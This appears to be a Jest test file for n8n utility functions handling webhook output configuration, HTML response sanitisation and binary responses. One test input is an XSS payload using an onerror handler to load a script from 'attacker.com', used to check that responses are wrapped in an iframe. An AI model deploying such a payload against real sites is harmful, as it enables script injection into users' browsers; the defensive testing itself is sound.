import { BINARY_ENCODING, IDataObject } from 'n8n-workflow';
import {
	configuredOutputs,
	getBinaryResponse,
	replaceSingleQuotes,
	sanitizeResponseData,
} from '../utils';

describe('configuredOutputs', () => {
	it('returns array of objects when version >= 1.3', () => {
		const result = configuredOutputs(1.3, {});
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns array of objects when version > 1.4 and enableResponseOutput', () => {
		const result = configuredOutputs(2, { enableResponseOutput: true });
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns ["main"] when version < 1.3', () => {
		const result = configuredOutputs(1.2, {});
		expect(result).toEqual(['main']);
	});

	it('returns array of objects when version  1.4 and enableResponseOutput', () => {
		const result = configuredOutputs(1.4, { enableResponseOutput: true });
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns ["main"] when version  1.4 and !enableResponseOutput', () => {
		const result = configuredOutputs(1.4, { enableResponseOutput: false });
		expect(result).toEqual(['main']);
	});
});

describe('sanitizeResponseData', () => {
	test.each([
		{
			src: 'https://example.com',
		},
		{
			src: "<source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
		},
		{
			src: "<div>Test with  'single quote'</div>",
		},
	])('wraps the response body in an iframe', ({ src }) => {
		const result = sanitizeResponseData(src, true);
		const singleQuoteReplaced = replaceSingleQuotes(src);

		expect(result).toContain('<iframe');
		expect(result).toContain(`srcdoc='${singleQuoteReplaced}'`);
		expect(result).toContain('width:100vw');
		expect(result).toContain('height:100vh');
		expect(result).toContain('position:fixed');
		expect(result).toContain('top:0');
		expect(result).toContain('left:0');
		expect(result).toContain('border:none');
		expect(result).toContain('allowtransparency="true"');
		expect(result.trim().startsWith('<iframe')).toBe(true);
		expect(result.trim().endsWith('</iframe>')).toBe(true);
	});
});

describe('getBinaryResponse', () => {
	it('returns sanitized HTML when binaryData.id is present and mimeType is text/html', () => {
		const binaryData = {
			id: '123',
			data: '<h1>Hello</h1>',
			mimeType: 'text/html',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(result).toBe(sanitizeResponseData(binaryData.data, false));
		expect(headers['content-type']).toBe('text/html');
	});

	it('returns { binaryData } when binaryData.id is present and mimeType is not text/html', () => {
		const binaryData = {
			id: '123',
			data: 'some-binary-data',
			mimeType: 'application/octet-stream',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(result).toEqual({ binaryData });
		expect(headers['content-type']).toBe('application/octet-stream');
	});

	it('returns sanitized HTML when binaryData.id is not present and mimeType is text/html', () => {
		const binaryData = {
			data: '<h1>Hello</h1>',
			mimeType: 'text/html',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(result).toBe(
			sanitizeResponseData(Buffer.from(binaryData.data, BINARY_ENCODING).toString(), false),
		);
		expect(headers['content-type']).toBe('text/html');
	});

	it('returns Buffer when binaryData.id is not present and mimeType is not text/html', () => {
		const binaryData = {
			data: 'some-binary-data',
			mimeType: 'application/octet-stream',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(Buffer.isBuffer(result)).toBe(true);
		expect(result.toString()).toBe(Buffer.from(binaryData.data, BINARY_ENCODING).toString());
		expect(headers['content-type']).toBe('application/octet-stream');
		expect(headers['content-length']).toBe(Buffer.from(binaryData.data, BINARY_ENCODING).length);
	});
});
